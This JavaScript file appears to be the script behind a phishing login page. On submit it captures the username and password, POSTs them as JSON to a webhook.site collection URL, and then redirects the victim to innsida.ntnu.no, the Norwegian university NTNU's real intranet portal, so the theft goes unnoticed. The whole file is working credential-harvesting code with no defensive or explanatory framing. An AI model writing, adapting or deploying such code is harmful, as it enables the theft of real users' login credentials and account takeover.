document.addEventListener("DOMContentLoaded", function() {
    const loginForm = document.getElementById("loginForm");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
  
    loginForm.addEventListener("submit", function(event) {
      event.preventDefault();
      const username = usernameInput.value;
      const password = passwordInput.value;
  
      // Create an object with the user's input data
      const userData = {
        username: username,
        password: password,
      };
  
      // Send the data to the webhook
      sendToWebhook(userData);
    });
  });
  
  function sendToWebhook(data) {
    const webhookURL = "https://webhook.site/b54b9ea6-0e62-4cb3-88ba-1ec6725f9ae8"; // Replace with your webhook URL
    const requestOptions = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    };
  
    fetch(webhookURL, requestOptions)
      .then(response => {
        if (response.ok) {
          console.log("Data sent to the webhook successfully.");
        } else {
          console.error("Failed to send data to the webhook.");
        }
      })
      .catch(error => {
        console.error("Error occurred:", error);
      });
  }
  document.addEventListener("DOMContentLoaded", function() {
    const loginForm = document.getElementById("loginForm");
  
    if (loginForm) {
      loginForm.addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent the default form submission behavior
  
        // Get the username and password input values
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
  
        // You can add validation logic here if needed
        // For example, check if the username and password are not empty
  
        // Redirect to innsida.ntnu.no
        window.location.href = "https://innsida.ntnu.no";
      });
    }
  });
  